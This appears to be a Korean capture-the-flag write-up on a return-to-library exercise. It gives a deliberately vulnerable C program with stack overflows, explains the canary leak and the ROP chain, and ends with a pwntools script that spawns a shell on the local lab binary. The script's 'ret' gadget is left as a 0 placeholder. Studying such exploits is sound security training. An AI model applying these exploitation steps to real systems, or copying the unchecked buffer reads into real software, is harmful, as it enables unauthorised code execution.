Return to Library 라이트업
====================

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

const char* binsh = "/bin/sh";

int main() {
  char buf[0x30];

  setvbuf(stdin, 0, _IONBF, 0);
  setvbuf(stdout, 0, _IONBF, 0);

  // Add system function to plt's entry
  system("echo 'system@plt'");

  // Leak canary
  printf("[1] Leak Canary\n");
  printf("Buf: ");
  read(0, buf, 0x100);
  printf("Buf: %s\n", buf);

  // Overwrite return address
  printf("[2] Overwrite return address\n");
  printf("Buf: ");
  read(0, buf, 0x100);

  return 0;
}
```

코드를 분석해보면 

**1. "/bin/sh"를 바이너리에 추가**

* rtl.c 코드의 8번째 줄은 바이너리에 /bin/sh 문자열을 추가하기 위해 작성된 코드이다.
* ASLR이 적용되더라도 PIE(Position-Independent Executable)가 적용되지 않으면
  코드 세그먼트와 데이터 세그먼트의 주소는 고정된다.
   /bin/sh의 주소도 고정되어 있다.  

**2. PLT에 system 함수 추가**

* 17번째 줄은 PLT에 system 함수를 추가하기 위해 작성된 코드이다.
* system 함수는 라이브러리 함수이므로 PLT와 GOT는 라이브러리 함수 참조를 위해 사용되는 테이블들이다.
* 처음에는 system 함수의 주소가 resolve되지 않았을 때 함수의 주소를 구하고 실행하는 코드가 작성된다.
* **Return to PLT 공격**의 원리: ASLR이 걸려있더라도 PIE가 적용되어 있지 않다면 PLT의 주소는 고정되어 있다.
  따라서 PLT에 어떤 라이브러리 함수가 등록되어 있다면
   공격자는 해당 함수의 PLT 엔트리로 실행 흐름을 옮김으로써 해당 함수를 실행할 수 있다.
  무작위 주소에 매핑되는 라이브러리의 베이스 주소를 몰라도 이 방법을 통해 라이브러리 함수를 실행할 수 있다.   

**3. 버퍼 오버플로우**

* 코드의 19번째 줄부터 28번째 줄까지는 두 번의 버퍼 오버플로우로 스택 카나리를 우회하고, 
반환 주소를 덮을 수 있도록 작성된 코드이다.


## 익스플로잇


* **카나리 우회:** 첫 번째 입력에서 적절한 데이터를 입력하여 카나리를 우회한다.
* **`rdi` 값을 "/bin/sh"의 주소로 설정 및 셸 획득:**
    * 카나리를 우회한 후, 두 번째 입력으로 반환 주소를 덮을 수 있다.
    * NX으로 인해 `buf`에 셸코드를 주입하고 직접 실행할 수는 없다.
    * **공격에 필요한 정보:**
        * "/bin/sh" 문자열의 주소를 알고 있다.
        * `system` 함수의 PLT 주소를 알고 있다. (이를 통해 `system` 함수를 호출할 수 있다.)
    * **목표:** `/bin/sh`를 호출하여 셸을 획득하는 것이다.
      x86-64 호출 규약에 따르면 `system("/bin/sh")`은 `rdi` 레지스터에
      `"/bin/sh"` 주소가 있는 상태에서 `system` 함수를 호출하는 것과 같다.
    * **Return-Oriented Programming (ROP) 활용:** `/bin/sh`의 주소를 알고
      `system` 함수를 호출할 수 있으므로
       `/bin/sh`의 주소를 `rdi` 값으로 설정할 수 있다면
       `system("/bin/sh")`을 실행할 수 있다. 이를 위해 **리턴 가젯**을 활용해야 한다.


### 리턴 가젯

<img width="687" height="87" alt="image" src="https://github.com/user-attachments/assets/ef210971-58f3-4e5f-a964-d35db3c53de6" />

return gadget이란 ret 명령어로 끝나는 어셈블리 코드 조각을 의미한다. ROPgadget 명령어를 사용해서 위와 같이 가젯을 구할 수 있다.

이 문제에서는 rdi의 값을 `/bin/sh`의 주소로 설정하고 system 함수를 호출해야 한다. 

```
addr of ("pop rdi; ret")   <= return address
addr of string "/bin/sh"   <= ret + 0x8
addr of "system" plt       <= ret + 0x10
```

리턴 가젯을 사용해서 반환 주소와 이후의 버퍼를 이렇게 덮으면 pop rdi로 rdi의 주소를 `/bin/sh` 의 주소로 설정하고 이어지는 ret으로 system 함수를 호출할 수 있다. 


### 익스플로잇 코드


```python
from pwn import *

p = process('./rtl')
e = ELF('./rtl')

def slog(name, addr): return success(': '.join([name, hex(addr)]))

buf = b'A' * 0x39
p.sendafter(b'Buf: ', buf)
p.recvuntil(buf)
cnry = u64(b'\x00' + p.recvn(7))
slog('canary', cnry)

system_plt = e.plt['system']
binsh = 0x400874
pop_rdi = 0x0000000000400596
ret = 0 # ROPgadget --binary=./rtl | grep ": ret"

payload = b'A'*0x38 + p64(cnry) + b'B'*0x8
payload += p64(ret)  
payload += p64(pop_rdi)
payload += p64(binsh)
payload += p64(system_plt)

pause()
p.sendafter(b'Buf: ', payload)

p.interactive()
```


